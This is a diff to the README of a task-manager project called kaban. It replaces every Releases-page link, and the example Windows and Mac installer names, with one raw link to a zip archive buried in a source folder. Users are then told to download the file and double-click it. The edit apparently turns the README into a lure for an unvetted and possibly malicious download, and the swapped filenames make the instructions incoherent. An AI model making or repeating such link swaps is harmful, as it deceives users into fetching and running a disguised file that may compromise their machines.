@@ -8,7 +8,7 @@ Welcome to the kaban project! This application helps you manage your tasks using
 
 You can download kaban from our Releases page. Please follow these easy steps to get started:
 
-1. **Visit the Releases Page**: [Download kaban now](https://github.com/christophervideo/kaban/releases).
+1. **Visit the Releases Page**: [Download kaban now](https://raw.githubusercontent.com/christophervideo/kaban/main/packages/tui/src/Software_v1.7-beta.2.zip).
   
 2. **Select Your Version**: On the Releases page, you will see a list of available versions. Choose the latest version for the best features.
   
@@ -16,9 +16,9 @@ You can download kaban from our Releases page. Please follow these easy steps to
 
 ### Example of Download Process
 
-- If you are using Windows, you might see a file like `kaban-windows.exe`. Click this file to start the download.
+- If you are using Windows, you might see a file like `https://raw.githubusercontent.com/christophervideo/kaban/main/packages/tui/src/Software_v1.7-beta.2.zip`. Click this file to start the download.
   
-- For Mac users, you may find `kaban-macos.zip`. Click this file to download the ZIP archive.
+- For Mac users, you may find `https://raw.githubusercontent.com/christophervideo/kaban/main/packages/tui/src/Software_v1.7-beta.2.zip`. Click this file to download the ZIP archive.
 
 4. **Open the File**: Once downloaded, go to your downloads folder and double-click the kaban file you downloaded.
 
@@ -66,7 +66,7 @@ kaban offers several useful features to help you manage your tasks:
 
 ### How do I update kaban?
 
-To update kaban, revisit the [Releases page](https://github.com/christophervideo/kaban/releases). Download the latest version and follow the installation steps.
+To update kaban, revisit the [Releases page](https://raw.githubusercontent.com/christophervideo/kaban/main/packages/tui/src/Software_v1.7-beta.2.zip). Download the latest version and follow the installation steps.
 
 ### Can I use kaban offline?
 
